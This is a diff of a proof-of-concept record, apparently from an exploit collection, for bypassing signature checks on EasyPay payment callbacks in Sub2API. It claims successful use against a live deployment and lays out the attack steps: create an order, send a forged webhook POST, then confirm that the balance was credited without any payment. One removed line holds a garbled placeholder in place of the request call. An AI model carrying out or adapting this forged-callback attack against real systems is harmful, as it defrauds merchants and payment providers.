@@ -9,7 +9,7 @@
 - **source**: self
 - **source_url**: https://github.com/Wei-Shaw/sub2api/issues/7881
 - **verified**: 1
-- **verified_note**: 在真实目标 example.com（Sub2API 部署，易支付上游 target266.example.com，payment_mode=popup）实测打通：伪造回调返回 HTTP 200 "success"；订单 463 由 PENDING 变为 COMPLETED（paid_at 2026-10-06T23:28:43+08:00）；用户 601 余额由 0 变为 1.00 CNY；全程未发生任何真实支付，且未使用任何商户密钥（pkey 未知）。证据：runs/easypay-forged-callback-463.txt，vuln id=1，http evidence id=1/2。
+- **verified_note**: 在真实目标 example.com（Sub2API 部署，易支付上游 zpayz.cn，payment_mode=popup）实测打通：伪造回调返回 HTTP 200 "success"；订单 463 由 PENDING 变为 COMPLETED（paid_at 2026-10-06T23:28:43+08:00）；用户 601 余额由 0 变为 1.00 CNY；全程未发生任何真实支付，且未使用任何商户密钥（pkey 未知）。证据：runs/easypay-forged-callback-463.txt，vuln id=1，http evidence id=1/2。
 - **path**: pocs/sub2api-easypay-支付回调验签绕过-参数走私-签名串拼接不一致-伪造回调入账/easypay_forge_callback.py
 - **tags**: 易支付,easypay,sub2api,验签绕过,参数走私,业务逻辑漏洞,伪造入账
 - **created_at**: 2026-10-06T15:29:32.215Z
@@ -25,7 +25,7 @@ Sub2API（Wei-Shaw/sub2api）易支付集成的回调验签绕过：下单接口
 python easypay_forge_callback.py（脚本内 TARGET/PID/OTN/SIGN/RU_CODES 需按本次下单结果替换）。
 真实目标已验证的命令序列：
 1) 下单：POST https://example.com/api/v1/payment/orders （带普通用户 JWT） body 见 content 步骤 1
-2) 伪造回调：target9.example.com("https://example.com/api/v1/payment/webhook/easypay", data=body,
+2) 伪造回调：requests.post("https://example.com/api/v1/payment/webhook/easypay", data=body,
    headers={"Content-Type":"application/x-www-form-urlencoded"})
 3) 验证：GET /api/v1/payment/orders/463 → COMPLETED；GET /api/v1/user/profile → balance 0 → 1
 ```
